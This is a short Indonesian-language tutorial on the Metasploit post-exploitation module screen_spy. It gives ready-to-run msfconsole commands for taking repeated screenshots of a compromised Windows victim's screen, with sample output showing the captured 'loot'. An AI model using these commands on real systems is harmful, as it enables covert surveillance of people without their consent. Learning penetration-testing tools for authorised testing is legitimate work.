# screen_spy

Modul `screen_spy` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk memantau layar target secara real-time dengan menangkap tangkapan layar berkala, memungkinkan penyerang melihat aktivitas korban seperti jika sedang bekerja di depan komputer.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/screen_spy
set COUNT <JUMLAH_SCREENSHOT>
set DELAY <JEDA_PER_SCREENSHOT>
set RECORD true
set SESSION <ID>
set VIEW_SCREENSHOTS true
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Capturing 6 screenshots with a delay of 5 seconds
[*] Screen Spying Complete
[*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
[*] Deleting temporary screenshot file: /root/.msf4/logs/192.168.1.53.jpg
[*] Post module execution completed
```
